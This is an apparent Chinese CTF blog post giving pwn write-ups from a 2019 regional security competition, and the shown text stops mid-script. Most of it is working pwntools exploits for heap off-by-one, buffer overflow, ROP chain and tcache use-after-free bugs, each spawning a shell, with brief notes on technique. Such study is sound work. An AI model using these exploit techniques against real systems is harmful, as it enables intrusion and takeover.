<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  
  
  <title>second week | Hexo</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="10.14 ~ 10.20  这是今年信息安全竞赛华南赛区半决赛的 pwn 题, wp 基本来自大佬 day1pwn1 off by one  1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *p &#x3D; process(&#x27;.&#x2F;pwn&#x27;)e">
<meta property="og:type" content="article">
<meta property="og:title" content="second week">
<meta property="og:url" content="http://example.com/2019/10/11/2019-10-14-2nd_week/index.html">
<meta property="og:site_name" content="Hexo">
<meta property="og:description" content="10.14 ~ 10.20  这是今年信息安全竞赛华南赛区半决赛的 pwn 题, wp 基本来自大佬 day1pwn1 off by one  1234567891011121314151617181920212223242526272829303132333435363738394041424344from pwn import *p &#x3D; process(&#x27;.&#x2F;pwn&#x27;)e">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2019-10-10T16:00:00.000Z">
<meta property="article:modified_time" content="2023-08-07T18:15:52.000Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
  
    <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
  
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
  
<link rel="stylesheet" href="/css/style.css">

  
    
<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">

  
  
<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/fork-awesome@1.2.0/css/fork-awesome.min.css">

<meta name="generator" content="Hexo 8.0.0"></head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">Hexo</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"><span class="fa fa-bars"></span></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
        
          <a class="nav-icon" href="/atom.xml" title="RSS Feed"><span class="fa fa-rss"></span></a>
        
        <a class="nav-icon nav-search-btn" title="Search"><span class="fa fa-search"></span></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://example.com"></form>
      </div>
    </div>
  </div>
</header>

      <div class="outer">
        <section id="main"><article id="post-2019-10-14-2nd_week" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2019/10/11/2019-10-14-2nd_week/" class="article-date">
  <time class="dt-published" datetime="2019-10-10T16:00:00.000Z" itemprop="datePublished">2019-10-11</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 class="p-name article-title" itemprop="headline name">
      second week
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <blockquote>
<p>10.14 ~ 10.20</p>
</blockquote>
<p>这是今年信息安全竞赛华南赛区半决赛的 pwn 题, wp 基本来自<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/5517">大佬</a></p>
<h1 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h1><h2 id="pwn1"><a href="#pwn1" class="headerlink" title="pwn1"></a>pwn1</h2><blockquote>
<p>off by one</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">p = process(&#x27;./pwn&#x27;)</span><br><span class="line">elf = ELF(&quot;./pwn&quot;, checksec=False)</span><br><span class="line">libc = ELF(&#x27;/lib/x86_64-linux-gnu/libc-2.23.so&#x27;, checksec=False)</span><br><span class="line">def new(ind,size,content):</span><br><span class="line">	p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;1&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;index:\n&#x27;,str(ind))</span><br><span class="line">	p.sendlineafter(&#x27;size:\n&#x27;,str(size))</span><br><span class="line">	p.sendafter(&#x27;content:\n&#x27;,content)</span><br><span class="line">def free(ind):</span><br><span class="line">	p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;2&#x27;)</span><br><span class="line">	p.sendafter(&#x27;index:\n&#x27;,str(ind))</span><br><span class="line">def edit(ind,content):</span><br><span class="line">	p.sendlineafter(&#x27;4.show\n&#x27;,&#x27;3&#x27;)</span><br><span class="line">	p.sendlineafter(&#x27;index:\n&#x27;,str(ind))</span><br><span class="line">	p.sendafter(&#x27;content:\n&#x27;,content)</span><br><span class="line">new(2,0xf8,&quot;/bin/sh&quot;)</span><br><span class="line">new(32,0xf8,&quot;32&quot;)</span><br><span class="line">new(31,0xf8,&quot;31&quot;)</span><br><span class="line">new(30,0xf8,&quot;30&quot;)</span><br><span class="line">pay = p64(0)+p64(0xf1)+p64(0x6021c8)+p64(0x6021c8+8)</span><br><span class="line">pay = pay.ljust(0xf0)</span><br><span class="line">pay += p64(0xf0)</span><br><span class="line">edit(32,pay)</span><br><span class="line">free(31)</span><br><span class="line">pay = p64(0x6021c8)*3 +  p64(elf.got[&#x27;free&#x27;])</span><br><span class="line">pay = pay.ljust(0xf0)</span><br><span class="line">pay += p64(1)</span><br><span class="line">edit(32,pay)</span><br><span class="line">p.sendline(&quot;4&quot;)</span><br><span class="line">p.recvuntil(&quot;index:&quot;)</span><br><span class="line">p.send(&quot;32&quot;)</span><br><span class="line">p.recvuntil(&#x27;\n&#x27;)</span><br><span class="line">leak = u64(p.recvuntil(&#x27;\n&#x27;)[:-1].ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">libc_base = leak - libc.symbols[&#x27;free&#x27;]</span><br><span class="line">system = libc.symbols[&#x27;system&#x27;] + libc_base</span><br><span class="line">free_hook = libc.symbols[&#x27;__free_hook&#x27;] + libc_base</span><br><span class="line">pay = &#x27;a&#x27;*0x18 +  p64(free_hook)</span><br><span class="line">pay = pay.ljust(0xf0,&#x27;a&#x27;)</span><br><span class="line">pay += p64(1)</span><br><span class="line">edit(30,pay)</span><br><span class="line">edit(32,p64(system))</span><br><span class="line">free(2)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>在这里记录一下貌似我看到的<code>off by one</code>都是使用 unlink 的方法,而且感觉总结出来一个算是心得的东西,就是有 PIE 的反而都是简单的,而不开的反而需要我们去认真分析每个堆的数据结构,通过了解这个来攻破</p>
<p>这里要详细记录一下,毕竟整出来了,23333</p>
<p>这里卡了一点,师傅直接用 free 整的 libc 偏移,今天我用个别的方法(看看行不行),还是感觉不是预期解,主要是没用到 leak</p>
<h2 id="pwn4"><a href="#pwn4" class="headerlink" title="pwn4"></a>pwn4</h2><blockquote>
<p>buffer overflow</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">p = remote(&quot;172.29.3.115&quot;,&quot;9999&quot;)</span><br><span class="line">#p = process(&#x27;./pwn&#x27;)</span><br><span class="line">libc = elf.libc</span><br><span class="line">payload = &#x27;a&#x27;*0x28</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(&#x27;a&#x27;*0x28)</span><br><span class="line">p.recv(8)</span><br><span class="line">leak = u32(p.recv(4))</span><br><span class="line">success(hex(leak))</span><br><span class="line">libc_base = leak - 0x1b23dc</span><br><span class="line">libc.address = libc_base</span><br><span class="line">one = libc_base + 0x3ac69</span><br><span class="line">print p.recv()</span><br><span class="line">payload = &#x27;a&#x27;*0x28 + &#x27;bbbb&#x27; + p32(one)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<p>这个很简单,我一开始想构造 rop 链,结果一看师傅直接 one_gadegt 妙出,秒啊,直接泄漏 libc.address 还行,这个记录一下,实在太秒了</p>
<h2 id="pwn8"><a href="#pwn8" class="headerlink" title="pwn8"></a>pwn8</h2><blockquote>
<p>逆向题???</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line">#io = process(&quot;./easy_pwn&quot;)</span><br><span class="line">io = remote(&quot;172.29.3.119&quot;,&quot;9999&quot;)</span><br><span class="line">elf = ELF(&quot;./easy_pwn&quot;)</span><br><span class="line">context.log_level = &quot;debug&quot;</span><br><span class="line">from struct import pack</span><br><span class="line"># Padding goes here</span><br><span class="line">p = &#x27;&#x27;</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax ; ret</span><br><span class="line">p += &#x27;/bin//sh&#x27;</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x000000000047f7b1) # mov qword ptr [rsi], rax ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004006e6) # pop rdi ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e0) # @ .data</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000004040fe) # pop rsi ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449bf5) # pop rdx ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x00000000006ba0e8) # @ .data + 8</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000444f00) # xor rax, rax ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000449b9c) # pop rax; ret</span><br><span class="line">p += p64(59) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x000000000040139c) # syscall</span><br><span class="line"></span><br><span class="line">strings = &quot;&quot;</span><br><span class="line">for i in p :</span><br><span class="line">    strings += chr(ord(i)^0x66)</span><br><span class="line"></span><br><span class="line">pay = &#x27;a&#x27;*0x50 + strings</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">io.sendline(pay)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>做这个的时候我只看到了栈溢出,然后觉得输入密码什么是个逆向题,后来发现直接 ropchain 直接完事.注意一下,在<code>ROPgadget --binary pwn --ropchain</code>时</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br><span class="line">p += pack(&#x27;&lt;Q&#x27;, 0x0000000000474c00) # add rax, 1 ; ret</span><br></pre></td></tr></table></figure>

<p>它直接<code>add rax, 1 ; ret</code>,硬生生抬了 59 ,主要是 ropchain 是只用地址完成的 getshell ,所以还是甩<code> ROPgadget --binary easy_pwn --only &quot;pop|ret&quot; | grep rax</code>比较简单,可以<code>pop rax; ret</code>后接一个 59 ,节省了 (59-2)*8 个字节</p>
<h2 id="pwn3"><a href="#pwn3" class="headerlink" title="pwn3"></a>pwn3</h2><blockquote>
<p>rop 构造,思路感人</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">#!/upr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">def piedebug(addr):</span><br><span class="line">    text_base = int(os.popen(&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;.format(p.pid)).readlines()[1],16)</span><br><span class="line">    log.info(&quot;elf_base:&#123;&#125;&quot;.format(hex(text_base)))</span><br><span class="line">    log.info(&quot;fake_heap:&#123;&#125;&quot;.format(hex(text_base + 0x202018)))</span><br><span class="line">    #log.info(&quot;get_array:&#123;&#125;&quot;.format(hex(text_base + 0x202140)))</span><br><span class="line">    if addr!=0:</span><br><span class="line">        gdb.attach(p,&#x27;b *&#123;&#125;&#x27;.format(hex(text_base+addr)))</span><br><span class="line">    else:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">#-------------------------------------</span><br><span class="line">def sl(s):</span><br><span class="line">    return p.sendline(s)</span><br><span class="line">def sd(s):</span><br><span class="line">    return p.send(s)</span><br><span class="line">def rc(timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recv()</span><br><span class="line">    else:</span><br><span class="line">        return p.recv(timeout=timeout)</span><br><span class="line">def ru(s, timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recvuntil(s)</span><br><span class="line">    else:</span><br><span class="line">        return p.recvuntil(s, timeout=timeout)</span><br><span class="line">def sla(p,a,s):</span><br><span class="line">    return p.sendlineafter(a,s)</span><br><span class="line">def sda(a,s):</span><br><span class="line">    return p.sendafter(a,s)</span><br><span class="line">def debug(addr=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p,addr)</span><br><span class="line">    pause()</span><br><span class="line">def getshell():</span><br><span class="line">    p.interactive()</span><br><span class="line">def msg(msg,addr):</span><br><span class="line">    log.warn(msg+&quot;-&gt;&quot;+hex(addr))</span><br><span class="line">#-------------------------------------</span><br><span class="line">def exp():</span><br><span class="line">    aaa=asm(shellcraft.sh())</span><br><span class="line">    pop_rdi_ret=0x00000000004005a3</span><br><span class="line">    pop_rsi_r15=0x00000000004005a1</span><br><span class="line">    pop_r14_r15=0x00000000004005a0</span><br><span class="line">    mov_eax_exe_ret=0x00000000004004e3 </span><br><span class="line">    pop_r12_r13_r14_r15=0x000000000040059c</span><br><span class="line">    pop_rbx_rbp_r12_r13_r14_r15=0x40059A</span><br><span class="line">    mov_rdx_r13_rsi_r14_edi_r15_call=0x400580</span><br><span class="line">    #call r12+rbx*8</span><br><span class="line"></span><br><span class="line">    ret=0x004003a9</span><br><span class="line">    main  = 0x4004ED</span><br><span class="line">    syscall_ret=0x0000000000400517</span><br><span class="line">    g = 0x4004da</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    pay = &quot;a&quot;*16+p64(main)</span><br><span class="line">    sd(pay)</span><br><span class="line">    #print p.recv()</span><br><span class="line">    stack = u64(p.recvuntil(&quot;\x7f&quot;)[-6:].ljust(8,&quot;\x00&quot;))</span><br><span class="line"></span><br><span class="line">    msg(&quot;stack&quot;,stack)</span><br><span class="line">    stack=stack-0x118</span><br><span class="line">    msg(&quot;stack&quot;,stack)</span><br><span class="line"></span><br><span class="line">    pay = &quot;/bin//sh\x00&quot;.ljust(0x10,&quot;\x00&quot;)</span><br><span class="line"></span><br><span class="line">    pay+=p64(pop_rbx_rbp_r12_r13_r14_r15)+p64(10)+p64(0)+p64(stack)+p64(0)+p64(0)*2</span><br><span class="line">    pay+=p64(mov_rdx_r13_rsi_r14_edi_r15_call)</span><br><span class="line"></span><br><span class="line">    pay+=p64(mov_eax_exe_ret)</span><br><span class="line">    pay+=p64(pop_rdi_ret)+p64(stack)</span><br><span class="line">    pay+=p64(pop_rsi_r15)+p64(0)*2</span><br><span class="line">    pay+=p64(syscall_ret)</span><br><span class="line">    sd(pay)</span><br><span class="line">    getshell()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if __name__ == &#x27;__main__&#x27;:</span><br><span class="line">    bin_elf = &quot;./pwn&quot;</span><br><span class="line">    elf = ELF(bin_elf)</span><br><span class="line">    context.binary=bin_elf</span><br><span class="line">    context.log_level = &quot;debug&quot;</span><br><span class="line"></span><br><span class="line">    if sys.argv[1] == &quot;r&quot;:</span><br><span class="line">        p = remote(&quot;172.29.3.114&quot;,9999)</span><br><span class="line">        libc = elf.libc</span><br><span class="line">    elif sys.argv[1] == &quot;l&quot;:</span><br><span class="line">        libc = elf.libc</span><br><span class="line">        p = process(bin_elf)</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>这道题我想的也是直接去布置 rop ,但是不知道栈地址,还好还好,这个 write 和 read 函数都能避免 <code>\x00</code> 截断问题,我们能根据 write 带出来一个特定偏移的地址,之后就是常规的布置 rop 了</p>
<p>但是,这里学到了,我之前一直以为去 <code>call   QWORD PTR [r12+rbx*8]</code> 之后的布置还需要在构造一下,因为我之前看到的都是把 rbx 步成 0 ,这个我没想到可以去直接用 rbx 去控制程序走向, orz</p>
<h2 id="pwn6"><a href="#pwn6" class="headerlink" title="pwn6"></a>pwn6</h2><blockquote>
<p>UAF ( tcache )</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line">#encoding:utf-8</span><br><span class="line">#!/upr/bin/env python</span><br><span class="line">from pwn import *</span><br><span class="line">def piedebug(addr):</span><br><span class="line">    text_base = int(os.popen(&quot;pmap &#123;&#125;|awk &#x27;&#123;&#123;print $1&#125;&#125;&#x27;&quot;.format(p.pid)).readlines()[1],16)</span><br><span class="line">    log.info(&quot;elf_base:&#123;&#125;&quot;.format(hex(text_base)))</span><br><span class="line">    log.info(&quot;fake_heap:&#123;&#125;&quot;.format(hex(text_base + 0x202018)))</span><br><span class="line">    #log.info(&quot;get_array:&#123;&#125;&quot;.format(hex(text_base + 0x202140)))</span><br><span class="line">    if addr!=0:</span><br><span class="line">        gdb.attach(p,&#x27;b *&#123;&#125;&#x27;.format(hex(text_base+addr)))</span><br><span class="line">    else:</span><br><span class="line">        gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">#-------------------------------------</span><br><span class="line">def sl(s):</span><br><span class="line">    return p.sendline(s)</span><br><span class="line">def sd(s):</span><br><span class="line">    return p.send(s)</span><br><span class="line">def rc(timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recv()</span><br><span class="line">    else:</span><br><span class="line">        return p.recv(timeout=timeout)</span><br><span class="line">def ru(s, timeout=0):</span><br><span class="line">    if timeout == 0:</span><br><span class="line">        return p.recvuntil(s)</span><br><span class="line">    else:</span><br><span class="line">        return p.recvuntil(s, timeout=timeout)</span><br><span class="line">def sla(p,a,s):</span><br><span class="line">    return p.sendlineafter(a,s)</span><br><span class="line">def sda(a,s):</span><br><span class="line">    return p.sendafter(a,s)</span><br><span class="line">def debug(addr=&#x27;&#x27;):</span><br><span class="line">    gdb.attach(p,addr)</span><br><span class="line">    pause()</span><br><span class="line">def getshell():</span><br><span class="line">    p.interactive()</span><br><span class="line">def msg(msg,addr):</span><br><span class="line">    log.warn(msg+&quot;-&gt;&quot;+hex(addr))</span><br><span class="line">#-------------------------------------</span><br><span class="line">def new(size,name,call):</span><br><span class="line">    ru(&quot;choice:&quot;)</span><br><span class="line">    sl(&quot;1&quot;)</span><br><span class="line">    ru(&quot;Please input the size of compary&#x27;s name\n&quot;)</span><br><span class="line">    sl(str(size))</span><br><span class="line">    ru(&quot;please input name:\n&quot;)</span><br><span class="line">    sd(name)</span><br><span class="line">    ru(&quot;please input compary call:\n&quot;)</span><br><span class="line">    sd(call)</span><br><span class="line"></span><br><span class="line">def free(idx):</span><br><span class="line">    ru(&quot;choice:&quot;)</span><br><span class="line">    sl(&quot;3&quot;)</span><br><span class="line">    ru(&quot;Please input the index:\n&quot;)</span><br><span class="line">    sl(str(idx))</span><br><span class="line"></span><br><span class="line">def show(size):</span><br><span class="line">    ru(&quot;choice:&quot;)</span><br><span class="line">    sl(&quot;2&quot;)</span><br><span class="line">    ru(&quot;Please input the index:\n&quot;)</span><br><span class="line">    sl(str(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def exp1():</span><br><span class="line">    new(0x18,&quot;a&quot;*8,&quot;b&quot;*8)</span><br><span class="line">    new(0x100,&quot;a&quot;*8,&quot;b&quot;*8)</span><br><span class="line">    new(0x100,&quot;a&quot;*8,&quot;b&quot;*8)</span><br><span class="line">    #</span><br><span class="line">    free(0)</span><br><span class="line">    for x in range(8):</span><br><span class="line">        free(1)</span><br><span class="line">    new(0x100,&quot;c&quot;*8,&quot;d&quot;*8)#3</span><br><span class="line">    show(3)</span><br><span class="line">    ru(&quot;c&quot;*8)</span><br><span class="line">    libc.address = u64(p.recv(6).ljust(8,&quot;\x00&quot;))-88-8-0x10-libc.sym[&quot;__malloc_hook&quot;]</span><br><span class="line">    free_hook = libc.sym[&quot;__free_hook&quot;]</span><br><span class="line">    system = libc.sym[&quot;system&quot;]</span><br><span class="line">    msg(&quot;libc.address&quot;,libc.address)</span><br><span class="line">    new(0x50,&quot;a&quot;*8,&quot;b&quot;*8)#4</span><br><span class="line">    new(0x50,&quot;a&quot;*8,&quot;b&quot;*8)</span><br><span class="line">    new(0x50,&quot;a&quot;*8,&quot;b&quot;*8)</span><br><span class="line">    free(4)</span><br><span class="line">    free(4)</span><br><span class="line">    new(0x50,p64(free_hook),&quot;b&quot;*8)</span><br><span class="line">    #piedebug(0)</span><br><span class="line">    new(0x50,&quot;/bin/sh\x00&quot;,&quot;b&quot;*8)</span><br><span class="line">    new(0x50,p64(system),&quot;b&quot;*8)</span><br><span class="line">    #piedebug(0)</span><br><span class="line">    free(7)</span><br><span class="line">#   ru(&quot;choice:&quot;)</span><br><span class="line">#   sl(&quot;3&quot;)</span><br><span class="line">#   print 